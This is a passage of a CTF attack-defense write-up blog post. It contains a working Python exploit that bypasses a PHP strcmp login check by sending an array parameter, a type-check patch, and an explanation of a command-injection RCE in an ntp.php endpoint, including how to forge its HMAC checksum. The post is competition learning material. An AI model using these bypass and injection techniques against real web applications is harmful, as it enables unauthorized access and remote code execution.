</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Hash <span style="color:#f92672">import</span> SHA256
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_flag_ids</span>(team_id, service_name):
</span></span><span style="display:flex;"><span>	url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://scoreboard.ctf.saarland/attack.json&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>		response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>		data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;flag_ids&#34;</span> <span style="color:#f92672">in</span> data <span style="color:#f92672">and</span> service_name <span style="color:#f92672">in</span> data[<span style="color:#e6db74">&#34;flag_ids&#34;</span>]: 
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> team_id <span style="color:#f92672">in</span> [team[<span style="color:#e6db74">&#34;id&#34;</span>] <span style="color:#66d9ef">for</span> team <span style="color:#f92672">in</span> data[<span style="color:#e6db74">&#34;teams&#34;</span>]]:
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">for</span> team <span style="color:#f92672">in</span> data[<span style="color:#e6db74">&#34;teams&#34;</span>]:
</span></span><span style="display:flex;"><span>					<span style="color:#66d9ef">if</span> team[<span style="color:#e6db74">&#34;id&#34;</span>] <span style="color:#f92672">==</span> team_id:
</span></span><span style="display:flex;"><span>						team_ip <span style="color:#f92672">=</span> next(team[<span style="color:#e6db74">&#34;ip&#34;</span>])
</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">return</span> data[<span style="color:#e6db74">&#34;flag_ids&#34;</span>][service_name]<span style="color:#f92672">.</span>get(team_ip, {})
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>			print(<span style="color:#e6db74">&#34;Invalid team_id or service_name&#34;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_data</span>(team_id, service_name, flag_id):
</span></span><span style="display:flex;"><span>	url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://scoreboard.ctf.saarland/attack.json&#34;</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>		response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url)
</span></span><span style="display:flex;"><span>		response<span style="color:#f92672">.</span>raise_for_status()
</span></span><span style="display:flex;"><span>		data <span style="color:#f92672">=</span> response<span style="color:#f92672">.</span>json()
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">for</span> team <span style="color:#f92672">in</span> data[<span style="color:#e6db74">&#34;teams&#34;</span>]:
</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> team[<span style="color:#e6db74">&#34;id&#34;</span>] <span style="color:#f92672">==</span> team_id:
</span></span><span style="display:flex;"><span>				team_ip <span style="color:#f92672">=</span> next(team[<span style="color:#e6db74">&#34;ip&#34;</span>]) 
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> data[<span style="color:#e6db74">&#34;flag_ids&#34;</span>][service_name][team_ip][flag_id]
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">except</span> requests<span style="color:#f92672">.</span>exceptions<span style="color:#f92672">.</span>RequestException <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>		print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>host <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>team <span style="color:#f92672">=</span> (int(host<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">1</span>])<span style="color:#f92672">-</span><span style="color:#ae81ff">32</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">200</span> <span style="color:#f92672">+</span> int(host<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;.&#34;</span>)[<span style="color:#ae81ff">2</span>])
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;I need to attack the team </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> with host: </span><span style="color:#e6db74">{}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>format(team,host))
</span></span><span style="display:flex;"><span>service <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Pasteable&#39;</span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> id <span style="color:#f92672">in</span> get_flag_ids(team,service):
</span></span><span style="display:flex;"><span>	username <span style="color:#f92672">=</span> get_data(team, service, id)
</span></span><span style="display:flex;"><span>	s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session() 
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:8080/func/challenge.php&#34;</span>, 
</span></span><span style="display:flex;"><span>				data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:username})
</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:8080/func/login.php&#34;</span>, 
</span></span><span style="display:flex;"><span>				data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;username&#34;</span>:username, <span style="color:#e6db74">&#34;solution[]&#34;</span>:<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>})
</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74">:8080/admin/&#34;</span>)
</span></span><span style="display:flex;"><span>	
</span></span><span style="display:flex;"><span>	print(res<span style="color:#f92672">.</span>text, flush<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
</span></span></code></pre></div><hr>
<h2 id="patch">Patch<a hidden class="anchor" aria-hidden="true" href="#patch">#</a></h2>
<p>To patch this vuln we have 2 options:</p>
<ol>
<li>Check the type of the <code>“solution”</code> parameter and allow only string values.</li>
<li>Check the <code>&quot;solution&quot;</code> parameter in another way, instead of using the <code>strcmp()</code> function.</li>
</ol>
<p>We decided to patch the service using the first option, and used the <code>gettype()</code> function to verify if <code>&quot;solution&quot;</code> was indeed a string.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;username&#39;</span>]) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span>	<span style="color:#f92672">!</span><span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#39;solution&#39;</span>]) <span style="color:#f92672">||</span> 
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">gettype</span>($_POST[<span style="color:#e6db74">&#34;solution&#34;</span>])<span style="color:#f92672">!=</span><span style="color:#e6db74">&#34;string&#34;</span>
</span></span><span style="display:flex;"><span>){ 
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;HTTP/1.0 403 Forbidden&#39;</span>); 
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Invalid request&#34;</span>); 
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><hr>
<h2 id="ps">P.S:<a hidden class="anchor" aria-hidden="true" href="#ps">#</a></h2>
<p>We also found a potential RCE in the <code>/func/ntp.php</code> file, but we didn&rsquo;t concentrate much on that because we had already a very efficient exploit running. Also the team was very short of players so we focused more on exploiting the other services.</p>
<p>Just for completeness, this is the potentially vulnerable code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e">// Network-Time-Protocol API
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// variables and configs
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;../func/config.php&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// ensure that requester knows super-duper-secret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$additional_time_formatter <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;modifiers&#39;</span>])) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;modifiers&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>$caller_nonce <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;nonce&#39;</span>])) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;nonce&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>$caller_checksum <span style="color:#f92672">=</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;checksum&#39;</span>])) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;checksum&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;modifiers&#39;</span>])) {
</span></span><span style="display:flex;"><span>    $nonce_hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $caller_nonce, $APP_SECRET);
</span></span><span style="display:flex;"><span>    $checksum <span style="color:#f92672">=</span> <span style="color:#a6e22e">hash_hmac</span>(<span style="color:#e6db74">&#39;sha256&#39;</span>, $additional_time_formatter, $nonce_hash);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// if the checksum is wrong, the requester is a bad guy who
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// doesn&#39;t know the secret
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span>($checksum <span style="color:#f92672">!==</span> $caller_checksum) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;ERROR: Checksum comparison has failed!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">// print current time
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>$time_command <span style="color:#f92672">=</span> ($APP_HOST <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;win&#39;</span>) <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34;date /t &amp;&amp; time /t&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;date&#34;</span>;
</span></span><span style="display:flex;"><span>$requested_time <span style="color:#f92672">=</span> <span style="color:#e6db74">`$time_command $additional_time_formatter`</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">preg_replace</span>(<span style="color:#e6db74">&#39;~[\r\n]+~&#39;</span>, <span style="color:#e6db74">&#39;&#39;</span>, $requested_time);
</span></span></code></pre></div><p>This <code>ntp.php</code> file uses OS commands to get the timestamp. The vulnerability is that a user-controlled parameter is appended to the command, this is exploitable and enables RCE on the backend.
The only complication is the hmac checksum verification, but this can be bypassed because:</p>
<ol>
<li>The <code>$APP_SECRET</code> is hardcoded and reused.</li>
<li>We have control over the <code>&quot;nonce&quot;</code> and the <code>&quot;checksum&quot;</code> parameters.
So, if we forge <code>&quot;checksum&quot;</code> and <code>&quot;nonce&quot;</code> based on our<code>&quot;modifiers&quot;</code> (which contains our code injection payload), we should achieve the RCE we&rsquo;ve longed for.</li>
</ol>


  </div>

  <footer class="post-footer">
  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="http://leo1.cc/">leo_something</a></span> · 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a><script src="https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>

<script>
    const images = Array.from(document.querySelectorAll(".post-content img"));
    images.forEach(img => {
        mediumZoom(img, {
            margin: 0,  
            scrollOffset: 40,  
            container: null,  
            template: null,  
            background: 'rgba(0, 0, 0, 0.8)'
        });
    });
</script>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'copy';

        function copyingDone() {
            copybutton.innerHTML = 'copied!';
            setTimeout(() => {
                copybutton.innerHTML = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
